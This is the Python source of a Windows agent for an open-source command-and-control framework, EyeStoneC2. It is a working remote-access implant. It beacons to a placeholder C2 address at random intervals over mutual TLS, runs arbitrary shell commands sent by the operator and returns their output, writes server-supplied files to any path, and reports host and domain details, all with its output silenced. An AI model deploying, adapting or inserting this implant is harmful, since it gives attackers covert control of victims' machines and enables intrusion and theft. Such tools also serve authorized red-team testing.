
# EyeStoneC2 - Command & Control framework
# Copyright (C) 2025 Gabriel Pérez Navarro

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

#!/usr/bin/env python3

import sys
import os
import socket
import time 
import subprocess
import platform
from ctypes import *
import random
import ssl
from contextlib import redirect_stdout, redirect_stderr

C2_SERVER_IP = "IP_PLACEHOLDER"
C2_SERVER_PORT = PORT_PLACEHOLDER

    # Define structures
class OSVERSIONINFOEXW(Structure):
    _fields_ = [
        ("dwOSVersionInfoSize", c_ulong),
        ("dwMajorVersion", c_ulong),
        ("dwMinorVersion", c_ulong),
        ("dwBuildNumber", c_ulong),
        ("dwPlatformId", c_ulong),
        ("szCSDVersion", c_wchar * 128),
        ("wServicePackMajor", c_ushort),
        ("wServicePackMinor", c_ushort),
        ("wSuiteMask", c_ushort),
        ("wProductType", c_byte),
        ("wReserved", c_byte),
    ]

class SYSTEM_INFO_UNION(Structure):
    _fields_ = [("wProcessorArchitecture", c_ushort),
                ("wReserved", c_ushort)]

class SYSTEM_INFO(Structure):
    _fields_ = [
        ("u", SYSTEM_INFO_UNION),
        ("dwPageSize", c_ulong),
        ("lpMinimumApplicationAddress", c_void_p),
        ("lpMaximumApplicationAddress", c_void_p),
        ("dwActiveProcessorMask", c_void_p),
        ("dwNumberOfProcessors", c_ulong),
        ("dwProcessorType", c_ulong),
        ("dwAllocationGranularity", c_ulong),
        ("wProcessorLevel", c_ushort),
        ("wProcessorRevision", c_ushort),
    ]

def download_file(client_socket):

    client_socket.sendall("download:req:path".encode())

    dst_path = client_socket.recv(1024).decode()

    client_socket.sendall("download:req:data".encode())

    file_data = client_socket.recv(4096)

    try:

        with open(dst_path, 'wb') as dst_file:

            dst_file.write(file_data)

        client_socket.sendall("download:ok".encode())

    except (FileNotFoundError):

        client_socket.sendall("download:err:path_not_found".encode())

    except (IsADirectoryError):

        client_socket.sendall("download:err:invalid_path".encode())



def exec_command_file(client_socket):

    client_socket.sendall("command_file:req:commands".encode())

    command_list = client_socket.recv(8192).decode().strip().split('\n')

    success = True

    for command in command_list:

        if not command:
            continue

        output = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if output.returncode != 0:

            success = False

    if success == True:
        
        client_socket.sendall("command_file:exec:success".encode())

    else:

        client_socket.sendall("command_file:exec:fail".encode())



def get_os():

    sysname = "Windows"

    buffer = create_unicode_buffer(256)
    windll.kernel32.GetComputerNameW(buffer, byref(c_ulong(256)))
    nodename = buffer.value


    version_info = OSVERSIONINFOEXW()
    version_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW)
    ret = windll.ntdll.RtlGetVersion(byref(version_info))
    if ret != 0:
        raise OSError("Failed to get Windows version")

    release = f"{version_info.dwMajorVersion}.{version_info.dwMinorVersion}.{version_info.dwBuildNumber}"
    version = version_info.szCSDVersion
    if not version:
        version = "No Service Pack installed"


    sys_info = SYSTEM_INFO()
    windll.kernel32.GetNativeSystemInfo(byref(sys_info))
    arch_map = {
        0: "x86",
        5: "ARM",
        9: "x64",
        12: "ARM64"
    }
    machine = arch_map.get(sys_info.u.wProcessorArchitecture, "Unknown")


    domain_buffer = create_unicode_buffer(256)
    size = c_ulong(256)

    windll.secur32.GetComputerObjectNameW(2, domain_buffer, byref(size))

    if domain_buffer.value:
        domain = domain_buffer.value
    else:
        domain = "WORKGROUP"


    class WinUnameStruct(Structure):
        _fields_ = [
            ('sysname', c_char * 65),
            ('nodename', c_char * 65),
            ('release', c_char * 65),
            ('version', c_char * 65),
            ('machine', c_char * 65),
            ('domain', c_char * 65),
        ]

    result = WinUnameStruct()
    result.sysname = sysname.encode()[:64].ljust(65, b'\x00')
    result.nodename = nodename.encode()[:64].ljust(65, b'\x00')
    result.release = release.encode()[:64].ljust(65, b'\x00')
    result.version = version.encode()[:64].ljust(65, b'\x00')
    result.machine = machine.encode()[:64].ljust(65, b'\x00')
    result.domain = domain.encode()[:64].ljust(65, b'\x00')

    return result


def main():

    installed = True

    while installed == True:

        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.load_cert_chain(certfile="C:\\Users\\Public\\agent.crt", keyfile="C:\\Users\\Public\\agent.key")
        context.load_verify_locations(cafile='C:\\Users\\Public\\ca.crt')

        client_socket_unsecured = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket = context.wrap_socket(client_socket_unsecured, server_hostname='EyeStoneServer')

        try:

            beacon_server(client_socket)

            while True:

                command = client_socket.recv(8192).decode().strip()

                if command == 'agent:detach':

                    installed = False

                    break

                elif command == 'agent:remove':
                    
                    break

                elif command == 'getinfo:system':

                    output = get_os()

                    client_socket.sendall(output)

                elif command == 'data:download':

                    download_file(client_socket)


                elif command == 'data:command_file':

                    exec_command_file(client_socket)

                else:
                    output = subprocess.run(command, shell=True, capture_output=True)

                    if output.stdout.decode():
                        client_socket.sendall(output.stdout)
                    if output.stderr.decode():
                        client_socket.sendall(output.stderr)

                    if not output.stdout and not output.stderr:

                        client_socket.sendall("output:none".encode())

            client_socket.shutdown(socket.SHUT_RDWR)

            client_socket.close()


        except:

            client_socket.shutdown(socket.SHUT_RDWR)

            client_socket.close()

    sys.exit(0)


def beacon_server(client_socket):

    while True:

        random_int = random.randint(1, 3)

        time.sleep(random_int*60)

        try:

            client_socket.connect((C2_SERVER_IP,C2_SERVER_PORT))

            return

        except:

            continue
    


if __name__ == "__main__":

    with open(os.devnull, 'w') as devnull:
        with redirect_stdout(devnull), redirect_stderr(devnull):
            main()
